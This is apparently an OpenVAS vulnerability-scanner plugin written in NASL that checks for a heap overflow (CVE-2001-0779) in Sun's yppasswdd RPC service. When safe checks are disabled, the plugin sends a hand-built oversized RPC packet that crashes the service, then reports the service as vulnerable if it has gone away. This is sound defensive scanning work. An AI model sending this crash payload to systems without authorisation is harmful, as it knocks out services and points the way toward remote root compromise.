# OpenVAS Vulnerability Test
# $Id: yppasswdd.nasl 16 2013-10-27 13:09:52Z jan $
# Description: yppasswdd overflow
#
# Authors:
# Renaud Deraison <deraison@cvs.nessus.org>
#
# Copyright:
# Copyright (C) 2001 Renaud Deraison
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote RPC service 100009 (yppasswdd) is vulnerable
to a buffer overflow which allows any user to obtain a root
shell on this host.";

tag_solution = "disable this service if you don't use
it, or contact Sun for a patch";

if(description)
{
 script_id(80035);
 script_version("$Revision: 16 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 14:09:52 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2008-10-24 20:15:31 +0200 (Fri, 24 Oct 2008)");
 script_bugtraq_id(2763);
script_cve_id("CVE-2001-0779");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_tag(name:"risk_factor", value:"Critical");

 
 name = "yppasswdd overflow";
 
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_description(desc);
 
 summary = "heap overflow through yppasswdd";
 script_summary(summary);
 
 script_category(ACT_MIXED_ATTACK); 
 
 script_copyright("This script is Copyright (C) 2001 Renaud Deraison");
 family = "Gain a shell remotely";
 script_family(family);
 script_dependencies("secpod_rpc_portmap.nasl");
 script_require_keys("rpc/portmap");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("misc_func.inc");
include("global_settings.inc");

port = get_rpc_port(program:100009, protocol:IPPROTO_UDP);
if(port)
{
  if(!safe_checks())
  {
  if(get_port_state(port))
  {
   soc = open_sock_udp(port);
   if(soc)
   {
    #
    # We forge a bogus RPC request, with a way too long
    # argument. The remote process will die immediately,
    # and hopefully painlessly.
    #
    crp = crap(796);
    
    req = raw_string(0x56, 0x6C, 0x9F, 0x6B, 
    		     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02,
		     0x00, 0x01, 0x86, 0xA9, 0x00, 0x00, 0x00, 0x01,
		     0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
		     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		     0x00, 0x00, 0x03, 0x20, 0x80, 0x1C, 0x40, 0x11
		     ) + crp + raw_string(0x00, 0x00, 0x00, 0x02,
		     0x61, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03,
		     0x61, 0x61, 0x61, 0x00, 0x00, 0x00, 0x00, 0x03,
		     0x61, 0x61, 0x61, 0x00, 0x00, 0x00, 0x00, 0x02,
		     0x61, 0x61, 0x00, 0x00);
     send(socket:soc, data:req);
     r = recv(socket:soc, length:4096);
     if(r)
     {
      # if length(r) == 28, then the overflow did succeed. However,
      # I prefer to re-make a call to getrpcport(), that's safer
      # (who knows what exotic yppasswdd can reply ?)
      sleep(1);
      newport = get_rpc_port(program:100009, protocol:IPPROTO_UDP);
      set_kb_item(name:"rpc/yppasswd/sun_overflow", value:TRUE);
      if(!newport)
       security_hole(port:port, protocol:"udp");
     }
     close(soc);
   }
  }
 }
 else
 {
  if ( report_paranoia < 2 )exit(0);
  desc = "
 Summary:

The remote RPC service 100009 (yppasswdd) may be vulnerable
to a buffer overflow which would allow any user to obtain a root
shell on this host.

*** OpenVAS reports this vulnerability using only
*** information that was gathered. Use caution
*** when testing without safe checks enabled.

Solution: disable this service if you don't use
it, or contact Sun for a patch";
  set_kb_item(name:"rpc/yppasswd/sun_overflow", value:TRUE);
  security_hole(port:port, data:desc, protocol:"udp");
 }
}
